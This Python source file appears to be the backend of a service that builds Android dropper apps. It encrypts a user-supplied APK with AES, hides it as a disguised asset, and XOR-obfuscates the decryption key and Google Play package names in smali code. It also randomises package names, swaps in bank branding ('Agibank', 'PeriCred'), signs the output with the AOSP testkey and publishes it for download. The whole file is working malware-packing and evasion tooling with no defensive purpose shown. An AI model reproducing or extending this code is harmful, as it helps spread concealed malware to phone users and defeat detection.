import os
import random
import re
import secrets
import shutil
import string
import subprocess
import xml.etree.ElementTree as ET
import zipfile

from Crypto.Cipher import AES
from werkzeug.utils import secure_filename

from config import Config
from services.build_state import BUILD_STATUS
from services.data import add_build_history, add_history, update_amplification
from services.java_runtime import JAVA_BIN, java_env, keytool_bin


def encrypt_aes_ctr(data: bytes, key: bytes, iv: bytes) -> bytes:
    return AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=iv).encrypt(data)


def decrypt_aes_ctr(data: bytes, key: bytes, iv: bytes) -> bytes:
    return AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=iv).decrypt(data)


def _xor_bytes(data: bytes, xor_byte: int) -> bytes:
    return bytes(b ^ xor_byte for b in data)


def _smali_byte(value: int) -> str:
    value &= 0xFF
    if value >= 0x80:
        value -= 0x100
    return f"        {value}t"


def _smali_array_data(data: bytes) -> str:
    lines = "\n".join(_smali_byte(b) for b in data)
    return f"    .array-data 1\n{lines}\n    .end array-data"


def patch_payload_util_smali(
    dropper_work: str,
    *,
    xor_byte: int,
    asset_name: str,
    out_name: str,
    key: bytes,
    iv: bytes,
    cipher: str,
) -> None:
    """Reescreve constantes XOR'd em PayloadUtil.smali para este build."""
    path = None
    for root, _, files in os.walk(os.path.join(dropper_work, "smali")):
        if "PayloadUtil.smali" in files:
            path = os.path.join(root, "PayloadUtil.smali")
            break
    if not path:
        raise RuntimeError("PayloadUtil.smali nao encontrado no template.")

    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
        content = handle.read()

    content = re.sub(
        r"\.field private static final XOR:I = 0x[0-9a-fA-F]+",
        f".field private static final XOR:I = 0x{xor_byte:x}",
        content,
        count=1,
    )

    google_pkgs = (
        b"com.google.android.gms",
        b"com.android.vending",
        b"com.google.android.gsf",
        b"com.google.android.as",
        b"com.google.android.as.oss",
    )

    blobs = {
        "asset_data": _xor_bytes(asset_name.encode("utf-8"), xor_byte),
        "out_data": _xor_bytes(out_name.encode("utf-8"), xor_byte),
        "key_data": _xor_bytes(key, xor_byte),
        "iv_data": _xor_bytes(iv, xor_byte),
        "cipher_data": _xor_bytes(cipher.encode("utf-8"), xor_byte),
        "vending_data": _xor_bytes(b"com.android.vending", xor_byte),
        "mime_data": _xor_bytes(b"application/vnd.android.package-archive", xor_byte),
    }
    for i, pkg in enumerate(google_pkgs):
        blobs[f"pkg{i}_data"] = _xor_bytes(pkg, xor_byte)

    label_to_field_size = {
        "asset_data": len(blobs["asset_data"]),
        "out_data": len(blobs["out_data"]),
        "key_data": len(blobs["key_data"]),
        "iv_data": len(blobs["iv_data"]),
        "cipher_data": len(blobs["cipher_data"]),
        "vending_data": len(blobs["vending_data"]),
        "mime_data": len(blobs["mime_data"]),
    }
    for i in range(5):
        label_to_field_size[f"pkg{i}_data"] = len(blobs[f"pkg{i}_data"])

    for label, size in label_to_field_size.items():
        content = re.sub(
            rf"(const/16 v0, 0x[0-9a-fA-F]+\s+new-array v0, v0, \[B\s+fill-array-data v0, :{label})",
            f"const/16 v0, 0x{size:x}\n    new-array v0, v0, [B\n    fill-array-data v0, :{label}",
            content,
            count=1,
        )
        content = re.sub(
            rf"(:{label}\s*\n)\s*\.array-data 1\n.*?\n\s*\.end array-data",
            rf"\1{_smali_array_data(blobs[label])}",
            content,
            count=1,
            flags=re.S,
        )

    with open(path, "w", encoding="utf-8") as handle:
        handle.write(content)


def generate_package_name(app_name):
    suffix = secrets.choice(string.ascii_lowercase) + "".join(
        secrets.choice(string.ascii_lowercase + string.digits) for _ in range(5)
    )
    return f"{Config.PACKAGE_PREFIX}.{suffix}"


def apply_package_rename(dropper_work, old_package, new_package):
    old_path = old_package.replace(".", "/")
    new_path = new_package.replace(".", "/")
    old_smali_dir = os.path.join(dropper_work, "smali", old_path)
    new_smali_dir = os.path.join(dropper_work, "smali", new_path)

    for root_dir, _, files in os.walk(dropper_work):
        for file in files:
            if not file.endswith((".smali", ".xml")):
                continue
            file_path = os.path.join(root_dir, file)
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as file_handle:
                    content = file_handle.read()
                new_content = content.replace(old_package, new_package).replace(old_path, new_path)
                if new_content != content:
                    with open(file_path, "w", encoding="utf-8") as file_handle:
                        file_handle.write(new_content)
            except OSError:
                pass

    if not os.path.isdir(old_smali_dir):
        return

    os.makedirs(os.path.dirname(new_smali_dir), exist_ok=True)
    if os.path.exists(new_smali_dir):
        shutil.rmtree(new_smali_dir)
    shutil.move(old_smali_dir, new_smali_dir)

    smali_root = os.path.join(dropper_work, "smali")
    check_dir = os.path.dirname(old_smali_dir)
    while check_dir.startswith(smali_root) and check_dir != smali_root:
        try:
            if os.listdir(check_dir):
                break
            os.rmdir(check_dir)
            check_dir = os.path.dirname(check_dir)
        except OSError:
            break


def _set_status(build_id, status, progress, error=False, portal=None, owner=None, ephemeral=None):
    current = BUILD_STATUS.get(build_id, {})
    BUILD_STATUS[build_id] = {
        "status": status,
        "progress": progress,
        "error": error,
        "portal": portal if portal is not None else current.get("portal", "subscriber"),
        "owner": owner if owner is not None else current.get("owner"),
        "ephemeral": ephemeral if ephemeral is not None else current.get("ephemeral", False),
        "output_file": current.get("output_file"),
    }


def inject_secondary_dex(apk_path: str, dex_path: str, arcname: str = "classes2.dex") -> None:
    """Injeta DEX AndroidX/Material como classes2.dex (casca anti-stub).

    Reescreve o ZIP com zipfile → quebra alignment de 4 bytes.
    Sempre chamar zipalign_apk() antes de apksigner.
    """
    if not os.path.isfile(dex_path):
        raise RuntimeError(f"DEX de libs nao encontrado: {dex_path}")
    if not os.path.isfile(apk_path):
        raise RuntimeError(f"APK para injecao de DEX nao encontrado: {apk_path}")

    tmp_path = f"{apk_path}.dexinject"
    with zipfile.ZipFile(apk_path, "r") as zin, zipfile.ZipFile(
        tmp_path, "w", compression=zipfile.ZIP_DEFLATED
    ) as zout:
        for info in zin.infolist():
            if info.filename == arcname:
                continue
            # Preserve stored/deflated for resources.arsc and friends
            data = zin.read(info.filename)
            compress = zipfile.ZIP_STORED if info.compress_type == zipfile.ZIP_STORED else zipfile.ZIP_DEFLATED
            out_info = zipfile.ZipInfo(filename=info.filename, date_time=info.date_time)
            out_info.compress_type = compress
            out_info.external_attr = info.external_attr
            zout.writestr(out_info, data)
        zout.write(dex_path, arcname)
    os.replace(tmp_path, apk_path)


def _generate_keystore(
    keystore_path: str,
    store_pass: str,
    key_alias: str,
    key_pass: str,
    dname: str,
) -> None:
    """Gera keystore PKCS12 com DN fixo (release estável)."""
    keytool = keytool_bin()
    if not keytool:
        raise RuntimeError("keytool nao encontrado (JAVA_HOME/bin/keytool).")
    os.makedirs(os.path.dirname(keystore_path) or ".", exist_ok=True)
    cmd = [
        keytool,
        "-genkeypair",
        "-storetype",
        Config.KEYSTORE_STORE_TYPE,
        "-keystore",
        keystore_path,
        "-storepass",
        store_pass,
        "-keypass",
        key_pass,
        "-alias",
        key_alias,
        "-keyalg",
        Config.KEYSTORE_KEY_ALG,
        "-keysize",
        str(Config.KEYSTORE_KEY_SIZE),
        "-sigalg",
        Config.KEYSTORE_SIG_ALG,
        "-validity",
        str(Config.KEYSTORE_VALIDITY_DAYS),
        "-dname",
        dname,
    ]
    result = subprocess.run(
        cmd, capture_output=True, text=True, timeout=60, env=java_env()
    )
    if result.returncode != 0:
        err = (result.stderr or result.stdout or "keytool falhou").strip()
        raise RuntimeError(f"Falha ao gerar keystore: {err[:300]}")


def ensure_release_keystore() -> tuple[str, str, str, str]:
    """Garante signing/release.p12 (cria 1x se ausente). Retorna path, pass, alias, key_pass."""
    path = Config.RELEASE_KEYSTORE
    store_pass = Config.RELEASE_KEYSTORE_PASS
    key_pass = store_pass  # PKCS12: key pass == store pass
    alias = Config.RELEASE_KEY_ALIAS
    if not os.path.isfile(path):
        _generate_keystore(path, store_pass, alias, key_pass, Config.RELEASE_DNAME)
    return path, store_pass, alias, key_pass


def zipalign_apk(input_apk: str, output_apk: str) -> None:
    """Realinha APK apos inject_secondary_dex (apksigner nao realinha)."""
    if not os.path.isfile(Config.ZIPALIGN):
        raise RuntimeError("zipalign nao encontrado. Verifique APP-TEST/tools/android-sdk/.")
    cmd = [Config.ZIPALIGN, "-p", "-f", "4", input_apk, output_apk]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    if result.returncode != 0 or not os.path.isfile(output_apk):
        err = (result.stderr or result.stdout or "zipalign falhou").strip()
        raise RuntimeError(f"Falha no zipalign: {err[:300]}")


def sign_with_apksigner(
    aligned_apk: str,
    output_apk: str,
    *,
    keystore_path: str | None = None,
    store_pass: str | None = None,
    key_alias: str | None = None,
    key_pass: str | None = None,
    key_pk8: str | None = None,
    cert_pem: str | None = None,
) -> str:
    """Assina APK com apksigner (v2; v3 conforme Config). Sem v1.

    Preferir AOSP testkey via key_pk8+cert_pem; fallback PKCS12 via keystore_*.
    """
    if not os.path.isfile(Config.APKSIGNER):
        raise RuntimeError("apksigner nao encontrado. Verifique APP-TEST/tools/android-sdk/.")
    v3 = "true" if Config.APKSIGNER_V3_ENABLED else "false"
    cmd = [
        Config.APKSIGNER,
        "sign",
        "--v1-signing-enabled",
        "false",
        "--v2-signing-enabled",
        "true",
        "--v3-signing-enabled",
        v3,
        "--out",
        output_apk,
    ]
    if key_pk8 and cert_pem:
        if not os.path.isfile(key_pk8) or not os.path.isfile(cert_pem):
            raise RuntimeError("AOSP testkey ausente (signing/testkey.pk8 + testkey.x509.pem).")
        cmd.extend(["--key", key_pk8, "--cert", cert_pem])
    elif keystore_path:
        cmd.extend(
            [
                "--ks",
                keystore_path,
                "--ks-pass",
                f"pass:{store_pass}",
                "--ks-key-alias",
                key_alias,
                "--key-pass",
                f"pass:{key_pass}",
            ]
        )
    else:
        raise RuntimeError("Nenhum material de assinatura configurado.")
    cmd.append(aligned_apk)
    result = subprocess.run(
        cmd, capture_output=True, text=True, timeout=120, env=java_env()
    )
    if result.returncode != 0 or not os.path.isfile(output_apk):
        err = (result.stderr or result.stdout or "apksigner falhou").strip()
        raise RuntimeError(f"Falha na assinatura: {err[:300]}")
    return output_apk


def sign_release_apk(aligned_apk: str, output_apk: str) -> str:
    """Assina conforme Config.SIGNING_MODE (aosp_testkey | pkcs12)."""
    mode = (Config.SIGNING_MODE or "aosp_testkey").strip().lower()
    if mode == "aosp_testkey":
        return sign_with_apksigner(
            aligned_apk,
            output_apk,
            key_pk8=Config.AOSP_TESTKEY_PK8,
            cert_pem=Config.AOSP_TESTKEY_CERT,
        )
    keystore_path, store_pass, key_alias, key_pass = ensure_release_keystore()
    return sign_with_apksigner(
        aligned_apk,
        output_apk,
        keystore_path=keystore_path,
        store_pass=store_pass,
        key_alias=key_alias,
        key_pass=key_pass,
    )


def process_apk(
    build_id,
    user_apk_path,
    custom_app_name,
    username,
    custom_icon_path=None,
    persist=True,
    portal="subscriber",
):
    BUILD_STATUS[build_id] = {
        "status": "Iniciando...",
        "progress": 0,
        "portal": portal,
        "owner": username,
        "ephemeral": not persist,
    }

    try:
        if not JAVA_BIN:
            raise RuntimeError("Java nao encontrado. Instale OpenJDK 17+ ou defina JAVA_HOME.")

        if persist:
            add_build_history(username, custom_app_name, "processando", build_id)
        _set_status(build_id, "Extraindo APK...", 15, portal=portal, owner=username, ephemeral=not persist)

        user_apk_extracted = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_extracted")
        if os.path.exists(user_apk_extracted):
            shutil.rmtree(user_apk_extracted)
        os.makedirs(user_apk_extracted, exist_ok=True)

        try:
            with zipfile.ZipFile(user_apk_path, "r") as zip_ref:
                zip_ref.extractall(user_apk_extracted)
        except Exception:
            with zipfile.ZipFile(user_apk_path, "r") as zip_ref:
                for member in zip_ref.namelist():
                    try:
                        zip_ref.extract(member, user_apk_extracted)
                    except Exception:
                        pass

        if not os.path.exists(os.path.join(user_apk_extracted, "AndroidManifest.xml")):
            _set_status(build_id, "Extraindo arquivos...", 20)
            subprocess.run(
                f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" d "{user_apk_path}" -o "{user_apk_extracted}" -f',
                shell=True,
            )

        _set_status(build_id, "Preparando Dropper", 30)
        dropper_work = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_dropper")
        if os.path.exists(dropper_work):
            shutil.rmtree(dropper_work)
        shutil.copytree(
            Config.DROPPER_TEMPLATE,
            dropper_work,
            ignore=shutil.ignore_patterns("prebuilt", "build"),
        )

        app_name = custom_app_name if custom_app_name else "App"
        new_package = generate_package_name(app_name)

        _set_status(build_id, "Configurando aplicativo...", 35)
        apply_package_rename(dropper_work, Config.OLD_PACKAGE, new_package)

        if custom_icon_path and os.path.exists(custom_icon_path):
            for density in [
                "res/mipmap-hdpi",
                "res/mipmap-mdpi",
                "res/mipmap-xhdpi",
                "res/mipmap-xxhdpi",
                "res/mipmap-xxxhdpi",
            ]:
                path = os.path.join(dropper_work, density)
                os.makedirs(path, exist_ok=True)
                for name in ["ic_launcher.png", "ic_launcher_round.png"]:
                    shutil.copy2(custom_icon_path, os.path.join(path, name))

        strings_xml = os.path.join(dropper_work, "res/values/strings.xml")
        if os.path.exists(strings_xml):
            try:
                tree = ET.parse(strings_xml)
                root = tree.getroot()
                for string_node in root.findall("string"):
                    if string_node.get("name") == "app_name":
                        string_node.text = app_name
                tree.write(strings_xml, encoding="utf-8", xml_declaration=True)
            except Exception:
                pass

        for root_dir, _, files in os.walk(dropper_work):
            for file in files:
                if file.endswith((".smali", ".xml")):
                    file_path = os.path.join(root_dir, file)
                    try:
                        with open(file_path, "r", encoding="utf-8", errors="ignore") as file_handle:
                            content = file_handle.read()
                        new_content = (
                            content.replace("PeriCred", app_name)
                            .replace("Agibank", app_name)
                            .replace("AgiBank", app_name)
                        )
                        if content != new_content:
                            with open(file_path, "w", encoding="utf-8") as file_handle:
                                file_handle.write(new_content)
                    except Exception:
                        pass

        _set_status(build_id, "Injetando Payload", 60)
        with open(user_apk_path, "rb") as file_handle:
            payload_data = file_handle.read()

        key = secrets.token_bytes(32)
        iv = secrets.token_bytes(16)
        xor_byte = secrets.randbelow(255) + 1
        asset_name = random.choice(Config.ASSET_NAME_POOL)
        out_name = f"index_{secrets.token_hex(2)}.pak"
        ciphertext = encrypt_aes_ctr(payload_data, key, iv)

        roundtrip = decrypt_aes_ctr(ciphertext, key, iv)
        if roundtrip[:4] != b"PK\x03\x04" and payload_data[:4] == b"PK\x03\x04":
            raise RuntimeError("Gate AES falhou: magic PK ausente apos roundtrip.")
        if roundtrip != payload_data:
            raise RuntimeError("Gate AES falhou: plaintext diverge do payload.")

        assets_dir = os.path.join(dropper_work, "assets")
        os.makedirs(assets_dir, exist_ok=True)
        for stale in os.listdir(assets_dir):
            stale_path = os.path.join(assets_dir, stale)
            if os.path.isfile(stale_path):
                os.remove(stale_path)
        payload_path = os.path.join(assets_dir, asset_name)
        with open(payload_path, "wb") as file_handle:
            file_handle.write(ciphertext)

        patch_payload_util_smali(
            dropper_work,
            xor_byte=xor_byte,
            asset_name=asset_name,
            out_name=out_name,
            key=key,
            iv=iv,
            cipher=Config.CIPHER_TRANSFORM,
        )

        _set_status(build_id, "Compilando APK", 80)
        unsigned_apk = os.path.join(Config.OUTPUT_FOLDER, f"{build_id}_unsigned.apk")

        if not os.path.exists(Config.APKTOOL_JAR):
            raise RuntimeError("Ferramenta de compilacao nao encontrada.")

        res_b = subprocess.run(
            f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" b "{dropper_work}" -o "{unsigned_apk}"',
            shell=True,
            capture_output=True,
            text=True,
        )
        if not os.path.exists(unsigned_apk):
            subprocess.run(f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" empty-framework-dir', shell=True)
            res_b = subprocess.run(
                f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" b "{dropper_work}" -o "{unsigned_apk}"',
                shell=True,
                capture_output=True,
                text=True,
            )
            if not os.path.exists(unsigned_apk):
                err = (res_b.stderr or res_b.stdout or "apktool falhou sem mensagem").strip()
                raise RuntimeError(f"Erro na compilacao: {err[:300]}")

        _set_status(build_id, "Empacotando bibliotecas", 85)
        inject_secondary_dex(unsigned_apk, Config.DROPPER_LIBS_DEX)

        _set_status(build_id, "Assinando APK", 90)
        output_dir = os.path.join(Config.OUTPUT_FOLDER, build_id)
        os.makedirs(output_dir, exist_ok=True)

        if not os.path.isfile(Config.APKSIGNER) or not os.path.isfile(Config.ZIPALIGN):
            raise RuntimeError(
                "apksigner/zipalign nao encontrados. Verifique APP-TEST/tools/android-sdk/."
            )

        # inject_secondary_dex desalinha o ZIP → zipalign obrigatório antes do sign
        aligned_apk = os.path.join(output_dir, f"{build_id}_aligned.apk")
        signed_apk = os.path.join(output_dir, "app-release.apk")
        final_apk = None

        try:
            zipalign_apk(unsigned_apk, aligned_apk)
            final_apk = sign_release_apk(aligned_apk, signed_apk)
        finally:
            if os.path.exists(aligned_apk):
                os.remove(aligned_apk)

        if not final_apk or not os.path.isfile(final_apk):
            raise RuntimeError("Assinatura nao produziu APK final.")

        final_name = f"{secure_filename(app_name)}.apk"
        shutil.move(final_apk, os.path.join(Config.OUTPUT_FOLDER, final_name))
        BUILD_STATUS[build_id] = {
            "status": "Concluido",
            "progress": 100,
            "output_file": final_name,
            "portal": portal,
            "owner": username,
            "ephemeral": not persist,
        }
        if persist:
            add_build_history(username, custom_app_name, "concluido", build_id, final_name)
            update_amplification(username, "concluido")
            add_history(username, "Build APK", f"App: {app_name}", portal=portal)
            from services.public_app_service import register_public_download

            register_public_download(
                build_id=build_id,
                app_name=app_name,
                output_file=final_name,
                icon_path=custom_icon_path,
            )

    except Exception as exc:
        print(f"ERRO NO BUILD {build_id}: {exc}")
        _set_status(
            build_id,
            "Erro no processamento. Tente novamente.",
            0,
            error=True,
            portal=portal,
            owner=username,
            ephemeral=not persist,
        )
        if persist:
            add_build_history(username, custom_app_name, "erro", build_id)
            update_amplification(username, "erro")
